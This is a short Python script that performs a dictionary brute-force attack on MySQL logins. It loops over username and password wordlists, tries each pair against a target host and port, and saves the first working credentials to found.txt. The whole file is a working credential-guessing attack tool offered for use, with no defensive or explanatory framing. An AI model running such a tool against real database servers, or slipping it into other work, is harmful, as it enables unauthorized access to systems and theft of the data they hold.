#!/usr/bin/env python3
import requests
import html
import re
import os
import argparse
import pymysql
import sys

# database connection
def login(url, username, password,Bport):
	try:
		connection = pymysql.connect(host=url, port=Bport, user=username, passwd=password, database="COCHES")
		cursor = connection.cursor()
		print("CONSEGUIDO")
	# some other statements  with the help of cursor
		connection.close()
		return True;
	except pymysql.Error as e:
		return False
	else:
		print("done")
		return False
	return False
def main():
	parser = argparse.ArgumentParser(description='e.g. python3 %s -url http://example.com/pma/ -user root -dict password.txt' % (os.path.basename(__file__)))
	parser.add_argument('-url', help='The URL of target website')
	parser.add_argument('-user', default='root', help='The username of MySQL (default: root)')
	parser.add_argument('-udict', default='none.txt', help='The file path of username dictionary (default: NULL)')
	parser.add_argument('-pdict', default='password.txt', help='The file path of password dictionary (default: password.txt)')
	parser.add_argument('-port', default=3306, help='Port used for DB connection')
	args = parser.parse_args()
	url = args.url
	pwdDictionary = args.pdict
	userDictionary = args.udict
	Bport=args.port
	if url is None:
		parser.print_help()
		return

	#Getting passwords
	try:
		f = open(pwdDictionary, "r")
		passwords = re.split("[\r\n]+", f.read())
		f.close()
	except:
		print("[-] Failed to read '%s' file." % (pwdDictionary))
		return

	#Getting users
	try:
		f = open(userDictionary, "r")
		users = re.split("[\r\n]+", f.read())
		f.close()
	except:
		users = [args.user]

	for user in users:
		for password in passwords:
			if login(url, user, password,int(Bport)):
				print("[*] FOUND - %s / %s" % (user, password))

				f = open("found.txt", "w")
				f.write("%s / %s\n" % (user, password))
				f.close()
				sys.exit()
				break
			else:
				print("[!] FAILED - %s / %s" % (user, password))

if __name__ == '__main__':
	main()
